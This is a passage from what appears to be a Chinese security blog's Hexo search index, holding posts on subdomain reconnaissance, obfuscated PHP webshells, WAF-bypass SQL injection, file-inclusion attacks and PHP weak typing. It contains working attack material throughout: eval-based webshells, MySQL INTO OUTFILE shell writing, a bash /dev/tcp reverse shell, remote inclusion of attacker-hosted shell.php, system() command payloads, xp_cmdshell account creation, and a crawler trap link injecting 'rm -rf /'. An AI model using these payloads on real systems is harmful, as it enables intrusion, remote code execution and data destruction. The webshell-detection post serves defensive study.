PS：九和十，注意分寸，不能影响正常业务的。 。。。 好久没写这么长的博客了。。。]]></content>
      <tags>
        <tag>编程</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>PHP</tag>
        <tag>自动化</tag>
        <tag>tcpdump</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞挖掘之子域名采集]]></title>
    <url>%2F2017%2F04%2F29%2F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E5%AD%90%E5%9F%9F%E5%90%8D%E9%87%87%E9%9B%86%2F</url>
    <content type="text"><![CDATA[准备准备东西，以后就开始正式挖洞了(之前都是野生的啊[捂脸])，整理下相关的知识，方便自己查看吧。(求大佬们的姿势 *&gt;*) 1、Web子域名猜测与访问尝试猜测一些可能的子域名，然后浏览器访问下看是否存在。 2、搜索引擎查询比如: site:163.com 3、查询DNS的一些解析记录比如查询 MX、CNAME 记录等 比如用 nslookup命令 nslookup -qt=any bing.com 4、爬虫爬取页面提取子域名可以利用爬虫从页面源代码中提取子域名 比如burp 的spider爬虫 5、crossdomain.xml 文件6、通过 IP 反查whois，站长工具等 7、通过 HTTPS 证书搜集https的站点都有证书 打开证书，查看详细信息-&gt;使用者可选名称-&gt;DNS Name 8、一些漏洞的利用如： DNS 域传送漏洞 nslookup set type=ns xxx.com server servers address set type=any ls -d xxx.com 在线工具： http://i.links.cn/subdomain/ 可查询二级、三级等子域名 http://dns.aizhan.com/ 查询同 IP 绑定了哪些域名 https://crt.sh/ 根据 HTTPS 证书查询子域名 https://crt.sh/?q=%25.baidu.com https://censys.io/certificates?q=.example.com Censys.io查询 本地工具 Layer 子域名挖掘机 wydomain 猪猪侠：https://github.com/ring04h/wydomain subDomainsBrute Sublist3r 集合google，bing，crt.sh等强大的根据 python sublist3r.py -d example.com theHarvester python theHarvester.py -d example.com -b all 这个工具有个比较好的它能够搜集目标的邮箱。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webshell查杀的新思路]]></title>
    <url>%2F2017%2F04%2F27%2FWebshell%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[由于学校要举办个CTF比赛，所以没办法必须参加。。。然后就是准备各种脚本了，关于webshell的查杀有了一个新的想法。最简单的一句话形如：&lt;?php @eval($_POST[&#39;pass&#39;])?&gt;，原理很简单首先$_POST会获取POST到服务器的参数名为pass的POST请求数据，然后函数eval会将$_POST获取的字符串按照PHP语法进行解析，这样我们通过各种PHP函数的组合使用就能通过中国菜刀等工具对服务器的文件等进行操作，这也就是常见一句话的工作原理。 这里我用两个i春秋上的过狗马来分析下：第一个：123456789101112131415161718&lt;?php$mt=&quot;mFsKCleRfU&quot;;$ojj=&quot;IEBleldle&quot;;$hsa=&quot;E9TVFsnd2VuJ10p&quot;;$fnx=&quot;Ow==&quot;;$zk = str_replace(&quot;d&quot;,&quot;&quot;,&quot;sdtdrd_redpdldadcde&quot;);//字符串替换：替换sdtdrd_redpdldadcde里的d为空 得到函数str_replace$ef = $zk(&quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot;);//调用$zk 字符串替换：替换zbazsze64_zdzeczodze里的z为空 得到base64_decode$dva = $zk(&quot;p&quot;,&quot;&quot;,&quot;pcprpepaptpe_fpupnpcptpipopn&quot;);//调用$zk 字符串替换：替换pcprpepaptpe_fpupnpcptpipopn里的z为空 得到create_function创建匿名函数$zvm = $dva(&apos;&apos;, $ef($zk(&quot;le&quot;, &quot;&quot;, $ojj.$mt.$hsa.$fnx)));//分解步骤//$zvm=create_function(base64_decode(str_replace(&quot;le&quot;,&quot;&quot;,&quot;IEBleldlemFsKCleRfUE9TVFsnd2VuJ10pOw==&quot;))) //拼接后的语句//$zvm=create_function(base64_decode(IEBldmFsKCRfUE9TVFsnd2VuJ10pOw==))) //执行完str_replace函数后，返回base64加密后的字符串//$zvm=create_function(@eval($_POST[&apos;wen&apos;])); //执行完base64_decode 得到解密后的字符串 得到一句话木马 密码是wen$zvm(); //执行?&gt; 第二个：12345678910111213&lt;?php$uf=&quot;snd2Fqd&quot;;$ka=&quot;IEBldmFsK&quot;;$pjt=&quot;CRfUE9TVF&quot;;$vbl = str_replace(&quot;ti&quot;,&quot;&quot;,&quot;tistittirti_rtietipltiatice&quot;); //空格替换ti str_replace$iqw=&quot;WVqaSddKTs=&quot;;$bkf = $vbl(&quot;k&quot;, &quot;&quot;, &quot;kbakske6k4k_kdkekckokdke&quot;); //空格替换k base64_decode （base64加密）$sbp = $vbl(&quot;ctw&quot;,&quot;&quot;,&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;); //空格替换ctw create_function$mpy = $sbp(&apos;&apos;, $bkf($vbl(&quot;b&quot;, &quot;&quot;, $ka.$pjt.$uf.$iqw)));//$mpy =create_function(&apos;&apos;, base64_decode(str_replace(&quot;b&quot;, &quot;&quot;,&apos;IEBldmFsKCRfUE9TVFsnd2FqdWVqaSddKTs=&apos;)))//$mpy= @eval($_POST[&apos;wajueji&apos;]);$mpy();?&gt; 现在的webshell大部分都是回调函数，匿名函数，及一些PHP的特殊的函数，或者是PHP的特性。构造出无特征的webshell，传统的基于正则的webshell查杀对于这些webshell是无法查出的，根据在D盾中的测试，就算报出，也是级别为1，2的低级的，基本上咱们就忽略了。 咱们都知道传统的webshell查杀基本上都是基于正则库(这里不得不吐槽下公司的那个webshell查杀工具，真几把垃圾的不行)，为什么我们自己就能断定某个PHP脚本是是webshell呢？因为我们在自己的大脑中虚拟调试了这个PHP脚本，知道它是干嘛的了，所以这就是和工具的区别，所以我打算开发的webshell查杀就是基于虚拟执行和正则的webshell查杀。 比如我们那上面的第一个列子：如果我们echo $zk,$ef,$dva,$zvm则结果为：str_replace,base64_decode,create_function,create_function(@eval($_POST[&#39;wen&#39;]))这样在基于正则匹配之后是不是就很明显了。 再来看几个例子：12&lt;?php$sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 12&lt;?php$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; 按照这个思路是不是很容易检测了。再来看一个：123456&lt;?php$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;$___=$$__;$_($___[_]); // assert($_POST[_]);?&gt; 所以现在要做的就是找出脚本中所有的变量及匿名函数即可。]]></content>
      <tags>
        <tag>运维</tag>
        <tag>CTF</tag>
        <tag>WAF绕过</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于'万能密码'的思考]]></title>
    <url>%2F2017%2F04%2F25%2F%E5%85%B3%E4%BA%8E%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[最近在总结的时候，关于SQL万能密码方面的一些思考。SQL万能密码，想必大家都知道，比如像类似的admin&#39; or &#39;1&#39;=&#39;1&#39;--这样的代码，就是让SQL的表达式返回true。 从而达到逻辑正确。 我们常用的注释符有：%00,%80-%99---- +#等如果过滤了or,--,#等特殊字符的话，我们的常用的万能密码就不能使用了，根据之前做命令执行绕过的经验，使用payload：&#39;||&#39; 和万能密钥一样，先闭合前面的语句，后面的&#39;与原语句闭合得到一串字符串，我们知道字符串肯定是非0的，然后再||或运算符运算后，得到的永远是true。]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>SQL注入</tag>
        <tag>万能密码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试之反弹shell命令分析]]></title>
    <url>%2F2017%2F04%2F12%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[我们在对linux主机进行渗透测试的时候，经常回用到反弹shell,之前也没好好去研究、理解具体都是干什么的，就只知道会用…(so low…-.-)最基本的反弹shell的代码如下： bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1 咱们一步一步来分析： Step 1bash -i 这个大家都知道就是打开一个交互式的bash Step 2/dev/tcp 这个是linux中一个特殊的设备，打开这个文件就相当于建立了一个socket连接，对这个文件的读写就相当于在这个socket连接中传输数据。linux中还有和它一样的文件/dev/udp。 Step 3/192.168.1.1/8080 这个是表示远程主机及监听的端口。 Step 40&gt;&amp;1 首先科普下linux shell下常用的文件描述符： 标准输入(stdin): 代码为’0’,使用 &lt; 或 &lt;&lt; 标准输出(stdout): 代码为’1’,使用 &gt; 或 &gt;&gt; 标准错误输出(stderr): 代码为’2’,使用 2&gt; 或 2&gt;&gt; 经过查找发现：&gt;&amp;和&amp;&gt;的作用是一样的，即： 0&gt;&amp;1和0&lt;&amp;1是一个意思，都是将标准输入重定向到标准输出中。 Step 5OVER!好奇心真的很有用啊! )_(]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL写shell的一些tips]]></title>
    <url>%2F2017%2F04%2F01%2FMySQL%E5%BE%97%E5%88%B0%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[通过注入写shell，首先需要找到网站的绝对路径。 一、找路径1.报错tips：有时候information_schema.tables不能用时，在MySQL 5.6及以上版本中可以使用以下表12?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()%23&amp;Submit=Submit%23?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name=schema()%23&amp;Submit=Submit%23 2.phpinfo3.load_file1SELECT LOAD_FILE(&apos;/etc/apache2/sites-available/default&apos;); tips：有时候过滤了敏感路径可以试试这样：1SELECT LOAD_FILE(&apos;/etc/sb/../passwd&apos;); 4.数组1user[]=1&amp;passwd[]=1 5.通过mysql函数 查找mysql安装目录1show variables like &apos;datadir&apos;; 二、写shell1.获取mysql.user和文件权限12select group_concat(user,0x3a,file_priv) from mysql.user;出现Y，这就代表你有文件权限，N就是没有 2.写shell123select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;E:\Web\errors.php&apos;如果不成功，可能转义了。select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;E:\\Web\\errors.php&apos; 最好还是把内容编码下。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>webshell</tag>
        <tag>MySQL</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入-绕过]]></title>
    <url>%2F2017%2F03%2F21%2FSQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[整理下关于SQL注入绕过的一些姿势。欢迎大牛补充 !^—^! 0x01 绕过waf思路从第一步起，一点一点去分析，然后绕过。 过滤 and,or 123preg_match(&apos;/(and|or)/i&apos;, $id)Filtered injection: 1 or 1 = 1 1 and 1 = 1Bypassed injection: 1 || 1 = 1 1 &amp;&amp; 1 = 1 过滤 and, or, union 123preg_match(&apos;/(and|or|union)/i&apos;, $id)Filtered injection: union select user, password from usersBypassed injection: 1 || (select user from users where user_id = 1) = &apos;admin&apos; 过滤 and, or, union, where 123preg_match(&apos;/(and|or|union|where)/i&apos;, $id)Filtered injection: 1 || (select user from users where user_id = 1) = &apos;admin&apos;Bypassed injection: 1 || (select user from users limit 1) = &apos;admin&apos; 过滤 and, or, union, where, limit 123preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id)Filtered injection: 1 || (select user from users limit 1) = &apos;admin&apos;Bypassed injection: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos; 过滤 and, or, union, where, limit, group by 123preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id)Filtered injection: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;Bypassed injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1 过滤 and, or, union, where, limit, group by, select 1234preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id)Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1Bypassed injection: 1 || 1 = 1 into outfile &apos;result.txt&apos;Bypassed injection: 1 || substr(user,1,1) = &apos;a&apos; 过滤 and, or, union, where, limit, group by, select, ‘ 12345preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id)Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1Bypassed injection: 1 || user_id is not nullBypassed injection: 1 || substr(user,1,1) = 0x61Bypassed injection: 1 || substr(user,1,1) = unhex(61) 过滤 and, or, union, where, limit, group by, select, ‘, hex 123preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id)Filtered injection: 1 || substr(user,1,1) = unhex(61)Bypassed injection: 1 || substr(user,1,1) = lower(conv(11,10,36)) 过滤 and, or, union, where, limit, group by, select, ‘, hex, substr 123preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id)Filtered injection: 1 || substr(user,1,1) = lower(conv(11,10,36))Bypassed injection: 1 || lpad(user,7,1) 过滤 and, or, union, where, limit, group by, select, ‘, hex, substr, 空格 123preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id)Filtered injection: 1 || lpad(user,7,1)ypassed injection: 1%0b||%0blpad(user,7,1) 0x02 正则绕过根据正则的的模糊匹配特性绕过，比如过滤了’=’filtered injection: 1 or 1 = 1Bypassed injection: 1 or 1,1 or ‘1’,1 or char(97)123456eg:filtered injection: 1 union select 1, table_name from information_schema.tables where table_name = &apos;users&apos;Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between &apos;a&apos; and &apos;z&apos;Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7aBypassed Injection: 1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273 0x03 通用绕过1.注释符 ?id=1+un//ion+se//lect+1,2,3– 2.大小写 ?id=1+UnIoN//SeLecT//1,2,3– 3.关键字替换有些waf等使用preg_replace替换了SQL关键字12?id=1+UNunionION+SEselectLECT+1,2,3--?id=1+uni%0bon+se%0blect+1,2,3-- 有时候注释符’/**/‘可能被过滤，也可以使用%0b绕过12Forbidden: http://localhost/id/1/**/||/**/lpad(first_name,7,1).htmlBypassed : http://localhost/id/1%0b||%0blpad(first_name,7,1).html 4.编码一个经典的脚本：Nukesentinel.php123456789101112131415// Check for UNION attack // Copyright 2004(c) Raven PHP Scripts $blocker_row = $blocker_array[1]; if($blocker_row[&apos;activate&apos;] &gt; 0) &#123; if (stristr($nsnst_const[&apos;query_string&apos;],&apos;+union+&apos;) OR \ stristr($nsnst_const[&apos;query_string&apos;],&apos;%20union%20&apos;) OR \ stristr($nsnst_const[&apos;query_string&apos;],&apos;*/union/*&apos;) OR \ stristr($nsnst_const[&apos;query_string&apos;],&apos; union &apos;) OR \ stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;+union+&apos;) OR \ stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;%20union%20&apos;) OR \ stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;*/union/*&apos;) OR \ stristr($nsnst_const[&apos;query_string_base64&apos;],&apos; union &apos;)) &#123; // block_ip($blocker_row); die(&quot;BLOCK IP 1 &quot; ); &#125; &#125; 123Forbidden: http://localhost/php/?/**/union/**/selectBypassed : http://localhost/php/?/%2A%2A/union/%2A%2A/selectBypassed : http://localhost/php/?%2f**%2funion%2f**%2fselect 5.缓冲区溢出 http://localhost/news.php?id=1+and+(select 1)=(select 0xA*1000)+union+select+1,2,version(),database(),user(),6,7,8,9,10– 6.内联注释(mysql)12http://localhost/news.php?id=1/*!UnIoN*/SeLecT+1,2,3--http://localhost/news.php?id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()-- 0x04 高级绕过1.HPP（http参数污染)举个例子：index.php?par1=val1&amp;par1=val2| web server | par1 || :— | :— || ASP.NET/IIS | val1,val2 || ASP/IIS | val1,val2 || PHP/Apache | val2 || JSP/Tomcat | val1 |eg:在ASP/ASP.NET的环境下1234Forbidden: http://localhost/search.aspx?q=select name,password from usersBypassed : http://localhost/search.aspx?q=select name&amp;q=password from usersBypassed : http://localhost/search.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/usersBypassed : http://localhost/news.aspx?id=1&apos;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell /*&amp;id=1*/ net user test test /*&amp;id=1*/ -- 2.HPC(http参数污染)RFC2396定义了如下一些字符：123Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &apos; ()Reserved : ; / ? : @ &amp; = + $ ,Unwise : &#123; &#125; | \ ^ [ ] ` 不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：| Query String | Apache/2.2.16,PHP/5.3.3 | IIS6/ASP || :— | :— | :— || ?test[1=2 | test_1=2 | test[1=2 || ?test=% | test=% | test= || ?test%00=1 | test= | test=1 || ?test=1%001 | NULL | test=1 || ?test+d=1+2 | test_d=1 2 | test d=1 2 |eg:123456Forbidden: http://localhost/?xp_cmdshellBypassed : http://localhost/?xp[cmdshellForbidden: http://localhost/test.asp?file=../flag.txtBypassed : http://localhost/test.asp?file=.%./flag.txtForbidden: http://localhost/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables)Bypassed : http://localhost/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含-Tips]]></title>
    <url>%2F2017%2F03%2F21%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-Tips%2F</url>
    <content type="text"><![CDATA[学校要搞个译文(真特么不明白有什么卵用…)，然后就找了几篇外国比较好的文章，趁着也涨点姿势。 基本的文件包含攻击不多说，都懂 http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into 192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.php 扩展的文件包含攻击加了个?不是很明白是什么原因，我觉得是截断。 http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.php? language=http://192.168.1.11/shell.php? 空字节截断%00都是老套路 http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into 192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.php%00 更改HTTP http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.ph？language = HTTP：//192.168.1.11/shell.php 更改图像扩展名不知道老外为啥这样说，我觉得是文件伪装啊 修改文件内容，在文件头添加GIF89a，然后修改文件后缀为shell.gif http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.ph?language=http：//192.168.1.11/shell.gif 黑名单攻击修改大小写啦，修改后缀啦，解析漏洞啦，比如.PHP,.php3,.asa,.cer这些啦等等。 http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.PHP Base64编码 http://192.168.1.113/bWAPP/rlfi.php?language= php://filter/read=convert.base64-encode-resource=http://192.168.1.11/shell.php 搞到最后老外自己还来个厉害了！！！,把我当时整蒙蔽了。。 PHP input输入流套路…123http://192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=lsPOST:&lt;?php system($_GET[&apos;cmd&apos;]);?&gt; Proc/self/environ这个有很多种的，不限于这个日志，比如access.log,error_log等各种日志文件。 通过包含User-Agent的proc/self/environ文件来利用12User-Agent: &lt;?php system($_GET[&apos;cmd&apos;]);?&gt;http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ&amp;cmd=id PHP文件包含自己的小概述 基本的本地文件包含&lt;?php include(“inc/” .$_GET[‘file’]);?&gt;包含文件在当前目录下：?file=.htaccess目录遍历：？file=../../../../../../../../var/lib/locate.db包含注入的PHP代码：？file=../../../../../../../var/log/apache/error.log一些技巧： 可能的Apache目录列表 包含访问日志，比如/proc/self/fd/X 包含来拥有更多信息的proc文件系统 包含电子邮件的日志文件 包含ssh的认证日志文件 auth.log 尽可能多的尝试头像/图片/附件文件上传 包含会话文件 包含PHP的临时上传文件（可以利用条件竞争）如果你有一个phpinfo()，请参考我们Drops的文章LFI with PHPInfo本地测试过程。 有限制的本地文件包含&lt;?php include(‘inc/’. $_GET[‘file’] . “.htm”); ?&gt;空字节注入：?file=../../../../../../../../etc/passwd%00（需要php配置关闭magic_quotes_gpc）空字节注入目录列表：?file=../../../../../../../var/www/accounts/%00（仅限于UFS系统中，并且需要关闭magic_quotes_gpc）路径截断：?file=../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\...点截断：?file=../../../../../../etc/passwd…………………………（仅限于windows系统中）反向路径截断：?file=../../../../[..]../../../etc/passwd 基本的远程文件包含&lt;?php include($_GET[‘file’]); ?&gt;包含远程代码：?file=[http|https|ftp]://websec.wordpress.com/shell.txt（需要allow_url_fopen、和allow_url_include开启）使用php：input输入流：?file=php://input（在POST参数中设置你的攻击载荷，注意urlencoding，并且需要allow_url_include开启）使用URIs数据：?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=（需要allow_url_include开启）使用XSS：?file=http://127.0.0.1/path/xss.php?xss=phpcode（只有在防火墙或在白名单内的域名才有效） 有限制的远程文件包含&lt;?php include($_GET[‘file’] . “htm”); ?&gt;file=https://websec.wordpress.com/shell?file=https://websec.wordpress.com/shell.txt??file=https://websec.wordpress.com/shell.txt%23（需要allow_url_fopen，allow_url_include开启）?file=\\evilshare\shell.php（绕过allow_url_fopen关闭的情况下）过滤器逃逸：访问带通配符的文件：]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于反爬虫的一个思考]]></title>
    <url>%2F2017%2F03%2F05%2F%E5%85%B3%E4%BA%8E%E5%8F%8D%E7%88%AC%E8%99%AB%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[最近在开发一个Python的系统，在写爬虫的时候突然想到一个特别猥琐的对付使用脚本进行批量检测的一个小方法。我们在进行批量扫描并检测的时候，都可能会调用一些系统命令，比如如下代码:1234...for i in get_new_urls: os.system(&quot;python sqlmap.py -u %s&quot; % i)... 以上代码，如果我们网站的url里有下面的一个链接：1&lt;a href=&quot;https://www.baidu.com | rm -rf / &quot;&gt; 那么脚本最后执行的命令就是：1os.system(&quot;python sqlmap.py -u https://www.baidu.com | rm -rf /&quot;) … 所以你懂的…]]></content>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP&XSS的一些小tips]]></title>
    <url>%2F2017%2F03%2F04%2FPHP%E5%BC%B1%E7%B1%BB%E5%9E%8B-XSS%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftips%2F</url>
    <content type="text"><![CDATA[最近搜集的一些，PHP过waf webshell,弱类型，openbasedir，XSS绕过的一些小tips，欢迎大牛纠错。-\- 无字母数字webshell构造123456789101112PHP TRUE == 1 FALSE == 0 TRUE + TRUE == 2 异或：&apos; ! &apos;^&apos; ` &apos; == &apos;A&apos;取反：~(&apos;和&apos;&#123;2&#125;) == &apos;s&apos;PHP 自增：仅允许字母字符自增&apos;a&apos;++ == &apos;b&apos;;&apos;z&apos;++ == &apos;aa&apos;;php 5.3&apos; &apos;.[] == &apos;Array&apos;&apos;Array&apos;&#123;0&#125; === &apos;A&apos;&apos;Array&apos;&#123;3&#125; === &apos;a&apos;&apos; &apos; == 0$_=&apos; &apos;.[]; $_&#123;&apos; &apos;&#125;===&apos;A&apos;; 渗透测试小tips 魔术引号不过滤$_SERVER[]字段，造成注入 mysql的类型强制转换可绕过PHP中empty()函数对0的false返回 1提交/?test=0axxx -&gt; empty($_GET[&apos;test&apos;]) =&gt; 返回真 当可控变量进入双引号中时可形成webshell 12$a = &quot;$&#123;@eval($_POST[s])&#125;&quot;;$a = &quot;$&#123;$&#123;eval($_POST[s])&#125;&#125;&quot;; 过滤了空格，逗号的注入，可使用括号包裹绕过 12select(location)from(website);select&#123;x(name)&#125;from&#123;x(manager)&#125;; 由于PHP弱类型验证机制，导致==、in_array()等可通过强制转换绕过验证。 12in_array($_GET[&apos;x&apos;],array(1,2,3,4,5))访问?test=’1’testtest可判断成功 windows特性 1windows下php中访问文件名使用”&lt;” “&gt;”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符 变量覆盖 12$GLOBALS,$_SERVER,$_GET,$_POST,$_COOKIE,$_REQUEST,$_FILES,$_ENV,$_SESSIONparse_str(),mb_parse_str(),import_request_variables(),extract() PHP的强制类型转换的原则 对于数学运算，字符串转换为数值 对于字符串运算，数值转换为字符串PHP弱类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051== 只检查值，不检查类型=== 既检查值，又检查类型NULL,0,”0”,array()使用==和false比较时，都是会返回true的，而使用===却不会123abc == 123 —&gt; true0 == &apos;abc&apos; —&gt; true&apos;0e132456789&apos;==&apos;0e7124511451155&apos; —&gt;true240610708、QNKCDZO、aabg7XSs、aabC9RqS的MD5相同intval()函数：string转intintval(&apos;0x1e240&apos;)==&apos;123456&apos; //trueintval(&apos;0x1e240&apos;)==123456 //trueintval(&apos;0x1e240&apos;)==&apos;1e240&apos; //false当其中的一个字符串是0x开头的时候，ox开头表示16进制，PHP会将此字符串解析成为十进制然后再进行比较，0×1e240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等对数组进行MD5，sha1等hash运算时，结果都为NULLmd5(name[] = 1) == md5(password[]= 2) —&gt;NULL == NULL —&gt;truestrcmpstrcmp(string $str1,string $str2 )如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。如果传入的参数为数字或数组,再和字符串做strcmp，就会返回NULLstrcmp($array,&apos;123&apos;) == 0当array为数字或者数组时，等式等于true$array=[1,2,3] —&gt; strcmp([1,2,3] ,&apos;123&apos;) —&gt; NULL —&gt;NULL == 0in_array()：函数搜索数组中是否存在指定的值$array=(0,1,2,&apos;3&apos;)in_array(&apos;abc&apos;, $array) —&gt; &apos;abc&apos; —&gt; 0 —&gt; 0 == array[0] —&gt; true$array=(0,1,2,3)in_array($search, $array)当传入$search = 1&apos;aaaaaaaa 结果为truein_array($search, $array) —&gt; 1&apos;aaaaaaaa —&gt; 1 —&gt; 1 == array[1] —&gt; true注：in_array 有第三个参数in_array(’5\’ union select’, array(1, 5, 3, 2), true) —&gt; falseeregereg(string pattern, string string, array [regs])字符串对比解析，以 pattern 的规则来解析比对字符串 string。比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析$ip = &quot;192.168.2.11&quot;.chr(0).&quot;haha&quot;; if(ereg(&quot;^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$&quot;,$ip)) &#123; echo $ip; &#125; else &#123; echo &quot;unknown&quot;; &#125; 输出：192.168.2.11haha注：结合ereg处理$ _SERVER的情况 绕过open_basedir12345利用DirectoryIterator + Glob 